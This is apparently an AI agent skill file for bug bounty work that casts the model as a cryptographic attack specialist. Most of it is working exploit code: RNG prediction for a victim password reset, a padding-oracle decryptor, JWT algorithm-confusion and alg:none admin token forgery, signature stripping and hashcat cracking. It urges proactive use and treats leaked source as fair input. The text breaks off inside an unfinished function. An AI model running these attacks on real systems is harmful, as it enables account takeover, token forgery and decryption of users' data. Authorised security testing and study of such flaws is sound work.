---
name: crypto-audit
description: "Cryptographic implementation security auditing - weak RNG, nonce/IV reuse, padding oracles, key derivation flaws, algorithm downgrade, signature bypass, and timing side-channels in crypto operations. Invoke this skill PROACTIVELY whenever: a target uses custom encryption, JWT/token generation, password hashing, TLS/certificate management, key exchange, or any cryptographic protocol. Also invoke when reviewing source code that imports crypto libraries (cryptography, javax.crypto, openssl, sodium, ring, webcrypto, subtle). Also invoke when you see base64-encoded tokens, encrypted cookies, or any endpoint that generates/validates tokens. This is the highest-ROI skill for targets like password managers, messaging apps, VPNs, payment processors, and any service handling encrypted data or generating security tokens. If you are testing ANY target and notice crypto operations - STOP and invoke this skill before continuing."
---
> **TYPOGRAPHY RULE: NEVER use em dashes in any output. Use a hyphen (-) or rewrite the sentence. Em dashes render as garbled text on HackerOne.**


# Cryptographic Implementation Security Auditing

You are operating as a cryptographic security specialist under authorized bug bounty testing. Every target that generates tokens, encrypts data, hashes passwords, or negotiates TLS has crypto attack surface. Most developers use crypto libraries correctly at the API level but make implementation mistakes in how they call those APIs - wrong modes, reused nonces, weak RNG, missing verification steps. Those mistakes are your targets.

Crypto bugs are high-severity by nature. A single nonce reuse in AES-GCM recovers the authentication key. A predictable RNG in token generation enables account takeover. A missing signature check lets you forge admin tokens. Find one, prove it, and the payout justifies the investment.

---

## Phase 0: Crypto Surface Discovery

Before attacking, map every crypto operation the target performs. Two minutes of discovery prevents two hours of testing the wrong thing.

### Source Code Signals (Import Detection)

When you have source access (open-source target, leaked source, JS bundles), grep for crypto imports. Each library tells you what crypto operations are in play.

| Language | Import Pattern | What It Tells You |
|----------|---------------|-------------------|
| Python | `from cryptography.fernet import Fernet` | Symmetric encryption (AES-CBC + HMAC) |
| Python | `from Crypto.Cipher import AES` (pycryptodome) | Raw AES - check mode, IV handling, padding |
| Python | `import hashlib` | Hashing - check if used for passwords (bad) or HMAC (ok) |
| Python | `from Crypto.PublicKey import RSA` | RSA operations - check key size, padding scheme |
| Python | `import secrets` vs `import random` | `secrets` is safe; `random` is MT19937, predictable |
| Java | `import javax.crypto.Cipher` | JCA crypto - check mode string (ECB is bad) |
| Java | `import org.bouncycastle.*` | BouncyCastle - wide API surface, check for misuse |
| Java | `import java.security.SecureRandom` vs `java.util.Random` | `Random` is LCG, fully predictable |
| Node.js | `require('crypto')` or `import crypto` | Built-in crypto - check `createCipheriv` mode and IV |
| Node.js | `require('tweetnacl')` or `require('sodium-native')` | NaCl/libsodium - generally safe, check nonce handling |
| Go | `import "crypto/aes"`, `"crypto/cipher"` | Standard library - check for GCM nonce reuse |
| Go | `import "crypto/rand"` vs `"math/rand"` | `math/rand` is not cryptographic, predictable |
| Rust | `use ring::aead` | ring library - check nonce generation |
| Rust | `use rustls` | TLS implementation - check config for weak ciphers |
| PHP | `openssl_encrypt()` | OpenSSL bindings - check mode, IV, key derivation |
| PHP | `mcrypt_encrypt()` | DEPRECATED library - known broken, likely vulnerable |
| PHP | `mt_rand()`, `rand()` | Mersenne Twister / libc rand - both predictable |

```bash
# Scan a cloned repo for crypto usage (run against target source)
grep -rn "import hashlib\|from Crypto\|from cryptography\|javax.crypto\|require('crypto')\|crypto/aes\|crypto/rand\|math/rand\|openssl_encrypt\|mcrypt_\|mt_rand\|Math.random\|java.util.Random" --include="*.py" --include="*.java" --include="*.js" --include="*.ts" --include="*.go" --include="*.rs" --include="*.php" .
```

### Network Signals

```bash
# TLS cipher suite and certificate details
curl -v --tlsv1.2 https://target.com 2>&1 | grep -i "cipher\|SSL\|TLS\|subject\|issuer\|expire"

# Full TLS audit with testssl.sh (if installed)
testssl.sh --quiet --color 0 https://target.com
```

| Network Signal | What It Reveals |
|---------------|-----------------|
| TLS 1.0/1.1 negotiated | Downgrade attack surface |
| RC4, DES, 3DES cipher suites | Weak symmetric crypto |
| RSA key exchange (no ECDHE/DHE) | No forward secrecy |
| Self-signed or expired certificate | Certificate validation issues |
| Missing HSTS header | TLS strip possible |
| `X-Content-Type-Options` missing | Not crypto, but often correlates with weak security posture |

### API and Traffic Signals

| Signal | Crypto Operation | Attack Class to Test |
|--------|-----------------|---------------------|
| `Authorization: Bearer eyJ...` (three dot-separated base64) | JWT token | Class 1 (RNG), Class 5 (alg downgrade), Class 6 (sig bypass) |
| Base64 blob in cookie (not JWT structure) | Encrypted session cookie | Class 2 (nonce/IV), Class 3 (padding oracle) |
| Hex string in URL parameter (32+ chars) | Token or encrypted value | Class 1 (RNG), Class 2 (nonce/IV) |
| `/api/encrypt`, `/api/decrypt` endpoints | Encryption oracle | Class 2 (nonce/IV), Class 3 (padding oracle) |
| `/api/sign`, `/api/verify` endpoints | Signature operations | Class 6 (sig bypass), Class 7 (timing) |
| `/api/token/generate`, `/api/token/refresh` | Token generation | Class 1 (RNG), Class 5 (downgrade) |
| Password reset link with token in URL | Token generation | Class 1 (RNG) |
| `Set-Cookie` with long base64 value after login | Encrypted/signed session | Class 3 (padding), Class 6 (sig bypass) |
| API returns `{"iv": "...", "ciphertext": "..."}` | Explicit IV in response | Class 2 (nonce/IV reuse) |

### Quick Enumeration Script

```python
import base64
import re
import sys

def analyze_token(token: str) -> dict:
    """Quick analysis of a token's structure."""
    result = {"raw": token, "type": "unknown", "length": len(token)}

    # JWT detection
    parts = token.split(".")
    if len(parts) == 3:
        try:
            # Pad base64 and decode header
            header_b64 = parts[0] + "=" * (4 - len(parts[0]) % 4)
            header = base64.urlsafe_b64decode(header_b64)
            result["type"] = "JWT"
            result["header"] = header.decode("utf-8", errors="replace")
        except Exception:
            pass

    # Hex detection
    if re.match(r'^[0-9a-fA-F]+$', token) and len(token) % 2 == 0:
        result["type"] = "hex"
        result["bytes"] = len(token) // 2
        if result["bytes"] == 16:
            result["hint"] = "128-bit - could be AES-128 key/IV or MD5 hash"
        elif result["bytes"] == 32:
            result["hint"] = "256-bit - could be AES-256 key or SHA-256 hash"

    # Base64 detection
    if re.match(r'^[A-Za-z0-9+/]+=*$', token) and len(token) > 20:
        try:
            decoded = base64.b64decode(token)
            result["type"] = "base64"
            result["decoded_bytes"] = len(decoded)
            if len(decoded) % 16 == 0:
                result["hint"] = "Length is multiple of 16 - likely AES ciphertext"
            if len(decoded) % 8 == 0 and len(decoded) % 16 != 0:
                result["hint"] = "Length is multiple of 8 but not 16 - could be DES/3DES"
        except Exception:
            pass

    return result

if __name__ == "__main__":
    token = sys.argv[1] if len(sys.argv) > 1 else input("Token: ").strip()
    import json
    print(json.dumps(analyze_token(token), indent=2))
```

---

## Attack Class 1: Weak Random Number Generation

### Context Signals

- Target generates session tokens, CSRF tokens, password reset tokens, API keys, or invite codes
- Source code uses `Math.random()` (JS), `random.random()` (Python), `rand()` (C/PHP), `mt_rand()` (PHP), `java.util.Random` (Java), `math/rand` (Go)
- Tokens are short (under 20 characters) or show visible patterns
- Multiple tokens collected in rapid succession share common prefixes or structure

### Detection Method

Collect 100+ tokens from the same endpoint in rapid succession. Analyze entropy and check for predictable patterns.

```bash
# Collect 200 tokens from a registration or reset endpoint
for i in $(seq 1 200); do
  curl -s https://target.com/api/password-reset \
    -X POST \
    -H "Content-Type: application/json" \
    -d '{"email":"test'$i'@yourdomain.com"}' \
    | python3 -c "import sys,json; print(json.load(sys.stdin).get('token',''))" \
    >> /tmp/tokens.txt
done
```

### Token Entropy Analysis Script

```python
import math
import sys
from collections import Counter

def shannon_entropy(data: str) -> float:
    """Calculate Shannon entropy in bits per character."""
    if not data:
        return 0.0
    counts = Counter(data)
    length = len(data)
    entropy = 0.0
    for count in counts.values():
        p = count / length
        if p > 0:
            entropy -= p * math.log2(p)
    return entropy

def analyze_tokens(token_file: str) -> None:
    with open(token_file) as f:
        tokens = [line.strip() for line in f if line.strip()]

    if len(tokens) < 10:
        print(f"[!] Only {len(tokens)} tokens collected. Need at least 50 for reliable analysis.")
        return

    print(f"[*] Analyzing {len(tokens)} tokens")
    print(f"[*] Token lengths: min={min(len(t) for t in tokens)}, max={max(len(t) for t in tokens)}")

    # Per-token entropy
    entropies = [shannon_entropy(t) for t in tokens]
    avg_entropy = sum(entropies) / len(entropies)
    print(f"[*] Average Shannon entropy: {avg_entropy:.3f} bits/char")

    # Theoretical max for the character set
    charset = set("".join(tokens))
    max_entropy = math.log2(len(charset)) if charset else 0
    print(f"[*] Character set size: {len(charset)} (max entropy: {max_entropy:.3f} bits/char)")
    print(f"[*] Entropy ratio: {avg_entropy/max_entropy:.1%}" if max_entropy > 0 else "")

    if avg_entropy < max_entropy * 0.7:
        print("[!] LOW ENTROPY - tokens may be predictable")
    elif avg_entropy < max_entropy * 0.85:
        print("[!] MODERATE ENTROPY - investigate further")
    else:
        print("[+] Entropy looks adequate")

    # Check for common prefixes (time-based seeding indicator)
    prefix_len = 0
    for i in range(min(len(t) for t in tokens)):
        if len(set(t[i] for t in tokens)) == 1:
            prefix_len += 1
        else:
            break
    if prefix_len > 0:
        print(f"[!] COMMON PREFIX: first {prefix_len} chars are identical across all tokens: '{tokens[0][:prefix_len]}'")

    # Check for sequential patterns
    if all(t.isdigit() for t in tokens):
        values = [int(t) for t in tokens]
        diffs = [values[i+1] - values[i] for i in range(len(values)-1)]
        if len(set(diffs)) == 1:
            print(f"[!] SEQUENTIAL: tokens increment by {diffs[0]} each time")
        elif len(set(diffs)) < 5:
            print(f"[!] NEAR-SEQUENTIAL: only {len(set(diffs))} unique differences between consecutive tokens")

    # Check for duplicate tokens
    dupes = len(tokens) - len(set(tokens))
    if dupes > 0:
        print(f"[!] DUPLICATES: {dupes} duplicate tokens found - RNG is broken or pool is tiny")

    # Per-position character frequency analysis
    min_len = min(len(t) for t in tokens)
    print(f"\n[*] Per-position analysis (first {min(min_len, 8)} positions):")
    for pos in range(min(min_len, 8)):
        chars_at_pos = [t[pos] for t in tokens]
        unique = len(set(chars_at_pos))
        most_common = Counter(chars_at_pos).most_common(1)[0]
        bias = most_common[1] / len(tokens)
        flag = " <-- BIASED" if bias > 0.3 else ""
        print(f"  Position {pos}: {unique} unique chars, most common '{most_common[0]}' at {bias:.0%}{flag}")

if __name__ == "__main__":
    analyze_tokens(sys.argv[1])
```

### Exploitation Steps

1. Collect 200+ tokens with timestamps (record `time.time()` for each request)
2. Run entropy analysis - if entropy is below 70% of theoretical max, proceed
3. If tokens are numeric or hex, check if they correlate with Unix timestamps
4. For MT19937 (Mersenne Twister) - collect 624 consecutive 32-bit outputs to reconstruct internal state and predict all future outputs
5. For time-seeded RNG - if you know the approximate generation time (within a few seconds), brute-force the seed
6. Generate the predicted next token and use it (password reset, session hijack, etc.)

### Proof Pattern

```python
# Demonstrate prediction: request a reset for victim, predict token, use it
import requests
import time

# Step 1: Note the time, request reset for victim
t_before = int(time.time())
requests.post("https://target.com/api/password-reset",
              json={"email": "victim@example.com"})
t_after = int(time.time())

# Step 2: Brute-force the seed (if time-based)
import random
for seed in range(t_before, t_after + 1):
    random.seed(seed)
    predicted_token = ''.join(random.choices('abcdef0123456789', k=32))
    # Step 3: Try the predicted token
    r = requests.post("https://target.com/api/password-reset/confirm",
                      json={"token": predicted_token, "new_password": "Pwned123!"})
    if r.status_code == 200:
        print(f"[!] Token predicted with seed={seed}: {predicted_token}")
        break
```

**What constitutes proof:** Predict the next token value before it is generated, or demonstrate statistical bias that reduces the keyspace below brute-force threshold for the token lifetime.

---

## Attack Class 2: Nonce/IV Reuse

### Context Signals

- Target uses AES-GCM, AES-CBC, or ChaCha20-Poly1305
- API returns encrypted data with visible IV/nonce prefix (first 12-16 bytes of ciphertext)
- Source code shows static nonce, counter-based nonce without persistence, or non-random nonce generation
- Multiple encryptions of the same plaintext produce identical ciphertext (IV reuse in CBC) or identical nonce prefix (GCM)

### Detection Method

**Method 1: Encrypt the same plaintext twice via API**

```bash
# If the target has an encrypt endpoint, send the same plaintext twice
PLAINTEXT="AAAAAAAAAAAAAAAA"  # 16 bytes for AES block alignment

CT1=$(curl -s https://target.com/api/encrypt \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"data":"'"$PLAINTEXT"'"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['ciphertext'])")

CT2=$(curl -s https://target.com/api/encrypt \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"data":"'"$PLAINTEXT"'"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['ciphertext'])")

echo "CT1: $CT1"
echo "CT2: $CT2"
# If CT1 == CT2 exactly: IV/nonce reuse CONFIRMED
# If first N bytes match: nonce reuse, rest differs due to plaintext position
```

**Method 2: Collect multiple ciphertexts and check for repeated nonce prefixes**

```python
import base64
from collections import Counter

def check_nonce_reuse(ciphertexts_b64: list[str], nonce_len: int = 12) -> None:
    """Check for nonce reuse across multiple ciphertexts.
    nonce_len: 12 for AES-GCM/ChaCha20, 16 for AES-CBC IV."""
    nonces = []
    for ct_b64 in ciphertexts_b64:
        ct_bytes = base64.b64decode(ct_b64)
        nonce = ct_bytes[:nonce_len]
        nonces.append(nonce.hex())

    counts = Counter(nonces)
    reused = {n: c for n, c in counts.items() if c > 1}
    if reused:
        print("[!] NONCE REUSE DETECTED:")
        for nonce_hex, count in reused.items():
            print(f"    Nonce {nonce_hex} used {count} times")
    else:
        print(f"[+] All {len(nonces)} nonces are unique")

# Usage: collect ciphertexts from the target, pass as base64 list
```

**Method 3: Source audit grep patterns**

```bash
# Static or hardcoded nonce/IV
grep -rn "nonce\s*=\s*b'" --include="*.py" .
grep -rn "iv\s*=\s*b'" --include="*.py" .
grep -rn 'new byte\[\]\s*{' --include="*.java" .
grep -rn "IV.*=.*Buffer.from" --include="*.js" --include="*.ts" .

# Counter nonce without persistence (resets on restart)
grep -rn "counter\s*=\s*0\|nonce_counter\s*=\s*0" --include="*.py" --include="*.js" .
```

### Exploitation Steps

**AES-GCM nonce reuse (catastrophic):**

When the same nonce is used twice with AES-GCM, XOR the two ciphertexts to cancel the keystream. This gives you `plaintext1 XOR plaintext2`. If you know one plaintext (chosen plaintext attack via API), you recover the other. Worse - the authentication key (GHASH key H) can be recovered, allowing you to forge authenticated ciphertexts for any plaintext.

```python
import base64

def xor_bytes(a: bytes, b: bytes) -> bytes:
    return bytes(x ^ y for x, y in zip(a, b))

# Two ciphertexts encrypted with the same GCM nonce
ct1 = base64.b64decode("CIPHERTEXT_1_BASE64")
ct2 = base64.b64decode("CIPHERTEXT_2_BASE64")

# Strip nonce prefix (first 12 bytes) and auth tag suffix (last 16 bytes)
nonce_len = 12
tag_len = 16
c1 = ct1[nonce_len:-tag_len]
c2 = ct2[nonce_len:-tag_len]

# XOR ciphertexts to get plaintext XOR
xored = xor_bytes(c1, c2)
print(f"P1 XOR P2: {xored.hex()}")

# If you know P1 (you sent it), recover P2:
known_plaintext = b"AAAAAAAAAAAAAAAA"
recovered = xor_bytes(xored[:len(known_plaintext)], known_plaintext)
print(f"Recovered P2: {recovered}")
```

**AES-CBC IV reuse:**

Same IV with same key means identical plaintext blocks produce identical first ciphertext blocks. Detectable but less catastrophic than GCM nonce reuse.

**ChaCha20-Poly1305 nonce reuse:**

Same impact as AES-GCM - keystream recovery and authentication key compromise.

### Proof Pattern

Demonstrate one of: (a) recover plaintext from two ciphertexts sharing a nonce, (b) forge a valid authenticated ciphertext using the recovered GHASH key, or (c) show two identical ciphertexts produced from the same plaintext (proving deterministic IV).

---

## Attack Class 3: Padding Oracle Attacks

### Context Signals

- Target uses AES-CBC mode (check TLS negotiation, source code, or API responses)
- Encrypted values in cookies, URL parameters, or API fields
- Modifying the ciphertext produces different error messages (not just a generic 500)
- Response timing differs between valid padding and invalid padding
- Technology stack includes legacy .NET (WebForms, ViewState), Java servlets, or custom crypto middleware

### Detection Method

PKCS#7 padding works by appending N bytes of value N to fill the last block. For a 16-byte AES block, valid padding ends with `\x01`, `\x02\x02`, `\x03\x03\x03`, etc. The oracle exists when the server tells you (via error message or timing) whether padding was valid before checking anything else.

```bash
# Step 1: Capture a valid encrypted value (cookie, parameter, etc.)
ENCRYPTED="BASE64_ENCRYPTED_VALUE_HERE"

# Step 2: Decode, flip the last byte of the second-to-last block, re-encode
python3 -c "
import base64, sys
ct = bytearray(base64.b64decode('$ENCRYPTED'))
# Flip last byte of penultimate block (affects padding of last block)
ct[-17] ^= 0x01
print(base64.b64encode(bytes(ct)).decode())
" > /tmp/modified_ct.txt

# Step 3: Send the modified ciphertext, observe the response
MODIFIED=$(cat /tmp/modified_ct.txt)
curl -s -o /dev/null -w "%{http_code} %{time_total}" \
  https://target.com/api/endpoint \
  -H "Cookie: session=$MODIFIED"

# Step 4: Compare with original - different status code or timing = oracle exists
curl -s -o /dev/null -w "%{http_code} %{time_total}" \
  https://target.com/api/endpoint \
  -H "Cookie: session=$ENCRYPTED"
```

**Oracle indicators:**

| Original Response | Modified Response | Oracle? |
|------------------|-------------------|---------|
| 200 OK | 500 "Padding invalid" | YES - error message oracle |
| 200 OK | 500 "Decryption failed" | YES - error message oracle |
| 200 OK, 50ms | 200 OK, 50ms (different body) | MAYBE - check body differences |
| 200 OK, 50ms | 200 OK, 150ms | YES - timing oracle |
| 200 OK | 400 Bad Request | YES - status code oracle |
| 200 OK | 302 Redirect to /error | YES - behavioral oracle |
| 200 OK | 200 OK (identical) | NO - server does not decrypt this value client-side |

### Byte-by-Byte Decryption

The attack works because you can control the intermediate value (decrypted block before XOR with previous ciphertext block). By manipulating the previous block's bytes and observing whether padding validates, you learn one byte of the intermediate value per correct guess. Then `plaintext_byte = intermediate_byte XOR original_previous_block_byte`.

For each byte position (starting from the last byte of the last block):
1. Set the target padding value (0x01 for last byte, 0x02 for second-to-last, etc.)
2. Try all 256 values for the corresponding byte in the previous block
3. The value that produces valid padding reveals the intermediate byte
4. XOR with the original byte to get plaintext

### Padding Oracle PoC Template

```python
import base64
import requests
import time
from typing import Optional

TARGET_URL = "https://target.com/api/endpoint"
BLOCK_SIZE = 16  # AES block size

def send_modified(ciphertext: bytes, cookie_name: str = "session") -> tuple[int, float]:
    """Send modified ciphertext, return (status_code, response_time)."""
    encoded = base64.b64encode(ciphertext).decode()
    t_start = time.perf_counter()
    r = requests.get(TARGET_URL, cookies={cookie_name: encoded}, timeout=10)
    t_end = time.perf_counter()
    return r.status_code, t_end - t_start

def has_valid_padding(ciphertext: bytes) -> bool:
    """Determine if the server accepted the padding.
    Adjust this function based on the oracle type you identified."""
    status, elapsed = send_modified(ciphertext)
    # Error message oracle: valid padding returns 200, invalid returns 500
    return status != 500
    # Timing oracle alternative:
    # return elapsed > 0.1  # valid padding takes longer (MAC check runs)

def decrypt_block(prev_block: bytes, target_block: bytes) -> bytes:
    """Decrypt a single block using the padding oracle."""
    intermediate = bytearray(BLOCK_SIZE)
    plaintext = bytearray(BLOCK_SIZE)

    for byte_pos in range(BLOCK_SIZE - 1, -1, -1):
        padding_value = BLOCK_SIZE - byte_pos

        # Build the attack block
        attack = bytearray(BLOCK_SIZE)
        # Set already-known bytes to produce correct padding
        for k in range(byte_pos + 1, BLOCK_SIZE):
            attack[k] = intermediate[k] ^ padding_value

        # Brute force the current byte
        for guess in range(256):
            attack[byte_pos] = guess
            test_ct = bytes(attack) + target_block

            if has_valid_padding(test_ct):
                # Edge case: when byte_pos is the last byte and padding_value is 1,
                # verify it is not a false positive (0x02 0x02 instead of 0x01)
                if byte_pos == BLOCK_SIZE - 1:
                    attack[byte_pos - 1] ^= 0x01
                    verify_ct = bytes(attack) + target_block
                    if not has_valid_padding(verify_ct):
                        continue

                intermediate[byte_pos] = guess ^ padding_value
                plaintext[byte_pos] = intermediate[byte_pos] ^ prev_block[byte_pos]
                print(f"  Byte {byte_pos}: 0x{plaintext[byte_pos]:02x} ('{chr(plaintext[byte_pos]) if 32 <= plaintext[byte_pos] < 127 else '.'}')")
                break
        else:
            print(f"  Byte {byte_pos}: FAILED - no valid padding found")
            return bytes(plaintext)

    return bytes(plaintext)

def decrypt_ciphertext(ciphertext_b64: str) -> bytes:
    """Decrypt full ciphertext using padding oracle, block by block."""
    ct = base64.b64decode(ciphertext_b64)
    if len(ct) % BLOCK_SIZE != 0:
        print(f"[!] Ciphertext length {len(ct)} is not a multiple of {BLOCK_SIZE}")
        return b""

    num_blocks = len(ct) // BLOCK_SIZE
    blocks = [ct[i*BLOCK_SIZE:(i+1)*BLOCK_SIZE] for i in range(num_blocks)]
    # First block is IV, remaining blocks are ciphertext
    plaintext = b""
    for i in range(1, num_blocks):
        print(f"[*] Decrypting block {i}/{num_blocks - 1}")
        decrypted = decrypt_block(blocks[i-1], blocks[i])
        plaintext += decrypted
    return plaintext

if __name__ == "__main__":
    import sys
    ct_b64 = sys.argv[1]
    result = decrypt_ciphertext(ct_b64)
    print(f"\n[*] Decrypted: {result}")
```

### Proof Pattern

Decrypt an encrypted session cookie or API token to reveal its plaintext contents. Then forge a modified plaintext (change user ID, role, or expiry) and re-encrypt it using the oracle to produce a valid ciphertext the server accepts.

---

## Attack Class 4: Key Derivation Weaknesses

### Context Signals

- Target has user registration and login (password storage is in play)
- Password reset or change endpoint responds faster than 100ms (suggests weak/no KDF)
- Source code uses `hashlib.md5()`, `hashlib.sha256()`, or `MessageDigest.getInstance("SHA-256")` for password hashing
- Leaked database or config file contains password hashes
- API response includes hash values (leaked via verbose errors, debug mode, or IDOR)
- Registration with the same password on two accounts produces identical hashes (no salt)

### Detection Method

**Timing-based algorithm detection:**

```python
import requests
import time
import statistics

def measure_login_time(url: str, email: str, password: str, n: int = 20) -> dict:
    """Measure login response time to infer hashing algorithm."""
    times = []
    for _ in range(n):
        t_start = time.perf_counter()
        requests.post(url, json={"email": email, "password": password}, timeout=10)
        t_end = time.perf_counter()
        times.append(t_end - t_start)

    avg = statistics.mean(times)
    med = statistics.median(times)

    print(f"[*] Login timing over {n} requests:")
    print(f"    Mean:   {avg*1000:.1f}ms")
    print(f"    Median: {med*1000:.1f}ms")

    if med < 0.010:  # Under 10ms
        print("[!] FAST - likely MD5/SHA1/SHA256 without KDF (or no password check at all)")
    elif med < 0.050:  # 10-50ms
        print("[!] MODERATE - could be bcrypt with low cost factor or single PBKDF2 iteration")
    elif med < 0.200:  # 50-200ms
        print("[+] REASONABLE - likely bcrypt cost 10+ or scrypt")
    else:
        print("[+] SLOW - likely argon2id or bcrypt with high cost factor")

    return {"mean_ms": avg*1000, "median_ms": med*1000}

# Usage:
# measure_login_time("https://target.com/api/login", "test@test.com", "Password123")
```

**Salt reuse detection (if you can see hashes):**

```bash
# Register two accounts with the same password, compare hashes
# If hashes match - no salt or same salt for all users
# bcrypt and argon2id embed the salt in the hash - same password always produces different hash
```

**Source code audit for weak patterns:**

```bash
# Dangerous patterns
grep -rn "md5(.*password\|sha1(.*password\|sha256(.*password\|hashlib.md5\|hashlib.sha1" \
  --include="*.py" --include="*.js" --include="*.java" --include="*.php" .

# Check bcrypt cost factor
grep -rn "bcrypt.*rounds\|bcrypt.*cost\|gensalt(\|BCRYPT_ROUNDS\|bcrypt_cost" \
  --include="*.py" --include="*.js" --include="*.java" --include="*.php" --include="*.rb" .

# Hardcoded keys
grep -rn "SECRET_KEY\|ENCRYPTION_KEY\|API_SECRET\|private_key\s*=" \
  --include="*.py" --include="*.js" --include="*.env" --include="*.yaml" --include="*.json" .
```

**KDF parameter audit table:**

| Algorithm | Parameter | Minimum Secure | Red Flag |
|-----------|----------|---------------|----------|
| bcrypt | cost factor | 10 | Below 8 |
| scrypt | N (CPU cost) | 2^15 (32768) | Below 2^14 |
| scrypt | r (block size) | 8 | Below 8 |
| scrypt | p (parallelism) | 1 | Not meaningful alone |
| argon2id | memory (KB) | 65536 (64MB) | Below 16384 |
| argon2id | time (iterations) | 3 | 1 |
| argon2id | parallelism | 4 | 1 |
| PBKDF2 | iterations | 600,000 (OWASP 2023) | Below 100,000 |

### Exploitation Steps

1. Identify the hashing algorithm (timing, source code, or hash format)
2. If hash is accessible (leaked, IDOR, verbose error), attempt offline cracking
3. If KDF parameters are weak, demonstrate cracking speed

```bash
# Hashcat examples for common hash types
# MD5
hashcat -m 0 -a 0 hash.txt rockyou.txt

# SHA-256
hashcat -m 1400 -a 0 hash.txt rockyou.txt

# bcrypt (cost 4 - demonstrably weak)
hashcat -m 3200 -a 0 hash.txt rockyou.txt

# MD5 with salt (salt:hash format)
hashcat -m 10 -a 0 hash.txt rockyou.txt
```

### Proof Pattern

Crack a captured hash to demonstrate the KDF weakness. For timing-based detection, show that login hashing completes in under 10ms (proving no proper KDF). For hardcoded keys, demonstrate decryption of a captured ciphertext using the discovered key.

---

## Attack Class 5: Algorithm Downgrade Attacks

### Context Signals

- Target supports multiple TLS versions or cipher suites
- JWT header has `alg` field that the client can influence
- SSH server advertises legacy key exchange algorithms
- API has versioned endpoints (`/v1/`, `/v2/`) with different crypto implementations
- Custom protocol performs capability negotiation at connection start

### Detection Method

**TLS downgrade testing:**

```bash
# Test for TLS 1.0 support (should be disabled)
curl -v --tlsv1.0 --tls-max 1.0 https://target.com 2>&1 | grep "SSL connection"

# Test for TLS 1.1 support (should be disabled)
curl -v --tlsv1.1 --tls-max 1.1 https://target.com 2>&1 | grep "SSL connection"

# Test for weak cipher suites
curl -v --ciphers "RC4-SHA:DES-CBC3-SHA:NULL-SHA" https://target.com 2>&1 | grep "SSL connection\|error"

# Test for export-grade crypto
curl -v --ciphers "EXP" https://target.com 2>&1 | grep "SSL connection\|error"

# Full testssl.sh audit (best option if available)
testssl.sh -p -E -U --quiet https://target.com
```

**JWT algorithm confusion (RS256 to HS256):**

```python
import base64
import hmac
import hashlib
import json
import requests

def jwt_alg_confusion(original_jwt: str, public_key_pem: str, target_url: str) -> None:
    """Exploit RS256-to-HS256 algorithm confusion.

    If the server uses the same key variable for both RS256 verification
    and HS256 verification, the public key (known to everyone) becomes
    the HMAC secret.
    """
    # Decode original payload
    parts = original_jwt.split(".")
    payload_b64 = parts[1]
    payload_padded = payload_b64 + "=" * (4 - len(payload_b64) % 4)
    payload = json.loads(base64.urlsafe_b64decode(payload_padded))

    # Modify payload (e.g., escalate privileges)
    payload["role"] = "admin"
    payload["sub"] = "admin"

    # Create new header with HS256
    header = {"alg": "HS256", "typ": "JWT"}
    header_b64 = base64.urlsafe_b64encode(
        json.dumps(header, separators=(",", ":")).encode()
    ).rstrip(b"=").decode()
    payload_b64_new = base64.urlsafe_b64encode(
        json.dumps(payload, separators=(",", ":")).encode()
    ).rstrip(b"=").decode()

    # Sign with the public key as HMAC secret
    signing_input = f"{header_b64}.{payload_b64_new}"
    # Use the raw PEM bytes as the HMAC key (including newlines)
    signature = hmac.new(
        public_key_pem.encode(),
        signing_input.encode(),
        hashlib.sha256
    ).digest()
    sig_b64 = base64.urlsafe_b64encode(signature).rstrip(b"=").decode()

    forged_jwt = f"{header_b64}.{payload_b64_new}.{sig_b64}"
    print(f"[*] Forged JWT: {forged_jwt}")

    # Test the forged token
    r = requests.get(target_url,
                     headers={"Authorization": f"Bearer {forged_jwt}"})
    print(f"[*] Response: {r.status_code}")
    if r.status_code == 200:
        print("[!] ALGORITHM CONFUSION CONFIRMED - forged admin JWT accepted")
    print(f"[*] Body: {r.text[:500]}")

# Get the public key from JWKS endpoint first:
# curl -s https://target.com/.well-known/jwks.json
```

**JWT alg:none bypass:**

```bash
# Forge alg:none token
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(echo -n '{"sub":"admin","role":"admin","iat":1700000000,"exp":9999999999}' | base64 -w0 | tr '+/' '-_' | tr -d '=')

# Variations to try (case-sensitivity bypass)
for ALG in "none" "None" "NONE" "nOnE"; do
  H=$(echo -n "{\"alg\":\"$ALG\",\"typ\":\"JWT\"}" | base64 -w0 | tr '+/' '-_' | tr -d '=')
  TOKEN="$H.$PAYLOAD."
  echo "Testing alg=$ALG: $TOKEN"
  curl -s -o /dev/null -w "%{http_code}" \
    https://target.com/api/me \
    -H "Authorization: Bearer $TOKEN"
  echo ""
done
```

**SSH downgrade detection:**

```bash
# Check for weak key exchange algorithms
ssh -vvv -o KexAlgorithms=diffie-hellman-group1-sha1 target.com 2>&1 | grep "kex:"

# Check for weak host key algorithms
ssh -vvv -o HostKeyAlgorithms=ssh-dss target.com 2>&1 | grep "host key"

# nmap SSH cipher audit
nmap --script ssh2-enum-algos -p 22 target.com
```

### Exploitation Steps

1. Identify all supported algorithms/versions (TLS, JWT, SSH, custom)
2. Force the weakest supported option
3. Demonstrate a concrete attack using the downgraded algorithm
4. For JWT: forge an admin token using the weaker algorithm
5. For TLS: demonstrate data interception or show BEAST/POODLE applicability

### Proof Pattern

Successfully authenticate or decrypt using the downgraded algorithm. For JWT alg confusion: show the forged admin token being accepted. For TLS: show the server accepting a connection with a known-broken cipher suite.

---

## Attack Class 6: Signature Verification Bypass

### Context Signals

- Tokens or signed data where the signature portion can be stripped or modified
- HMAC/MAC values transmitted alongside the data they protect
- Custom signing implementations (not using a well-tested library)
- Source code using `hash(secret + message)` instead of HMAC
- ECDSA signatures in authentication tokens
- RSA signatures with small public exponent (e=3)

### Detection Method

**Missing verification (strip signature):**

```bash
# JWT: remove the signature entirely
TOKEN="eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9."
curl -s https://target.com/api/me \
  -H "Authorization: Bearer $TOKEN"
# 200 with admin data = signature not verified

# Signed cookie: modify the data portion, keep old signature
# Or truncate the signature portion of the cookie
```

**Partial verification (modify unsigned portions):**

```bash
# Some systems only sign certain fields, not the entire payload
# Modify fields that might not be covered by the signature
# Common: query parameters added after signing, extra JSON fields
```

**Length extension attack detection (hash(secret||message) pattern):**

```python
import hashlib

def detect_length_extension_vulnerable(api_url: str) -> None:
    """Detect if MAC is constructed as hash(secret||message)
    rather than HMAC(secret, message).

